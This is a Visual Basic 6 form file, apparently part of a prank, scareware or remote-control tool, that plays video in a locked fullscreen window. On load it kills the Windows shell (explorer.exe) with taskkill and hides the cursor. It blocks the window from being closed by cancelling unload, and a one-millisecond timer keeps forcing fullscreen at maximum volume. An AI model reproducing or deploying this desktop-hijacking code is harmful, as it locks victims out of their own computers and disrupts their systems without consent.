VERSION 5.00
Object = "{6BF52A50-394A-11D3-B153-00C04F79FAA6}#1.0#0"; "wmp.dll"
Begin VB.Form Form6 
   BorderStyle     =   0  'None
   Caption         =   "Video Oynat"
   ClientHeight    =   3660
   ClientLeft      =   5715
   ClientTop       =   3255
   ClientWidth     =   8145
   LinkTopic       =   "Form6"
   ScaleHeight     =   3660
   ScaleWidth      =   8145
   ShowInTaskbar   =   0   'False
   StartUpPosition =   1  'CenterOwner
   WindowState     =   2  'Maximized
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   6360
      Top             =   1320
   End
   Begin WMPLibCtl.WindowsMediaPlayer Player1 
      Height          =   3615
      Left            =   0
      TabIndex        =   0
      Top             =   0
      Width           =   3615
      URL             =   ""
      rate            =   1
      balance         =   0
      currentPosition =   0
      defaultFrame    =   ""
      playCount       =   1
      autoStart       =   -1  'True
      currentMarker   =   0
      invokeURLs      =   -1  'True
      baseURL         =   ""
      volume          =   50
      mute            =   0   'False
      uiMode          =   "full"
      stretchToFit    =   0   'False
      windowlessVideo =   0   'False
      enabled         =   -1  'True
      enableContextMenu=   -1  'True
      fullScreen      =   0   'False
      SAMIStyle       =   ""
      SAMILang        =   ""
      SAMIFilename    =   ""
      captioningID    =   ""
      enableErrorDialogs=   0   'False
      _cx             =   6376
      _cy             =   6376
   End
End
Attribute VB_Name = "Form6"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function ShowCursor& Lib "user32" (ByVal bshow As Long)
Private Sub Form_Load()
On Error Resume Next
Form1.Timer1.Enabled = True
Shell "taskkill /F /IM " & "explorer.exe", vbHide
ShowCursor (False)
Player1.Enabled = True
End Sub

Public Sub form_nld()
On Error Resume Next
Form1.Timer1.Enabled = False
Shell "explorer.exe", vbHide
ShowCursor (True)
End Sub

Private Sub Form_Unload(Cancel As Integer)
On Error Resume Next
Cancel = True

End Sub

Private Sub Timer1_Timer()
On Error Resume Next
topmost = True
Player1.Width = Form6.Width
Player1.Height = Form6.Height
ShowCursor (False)
Player1.fullScreen = True
Player1.settings.autoStart = True
Player1.settings.Volume = 100
End Sub
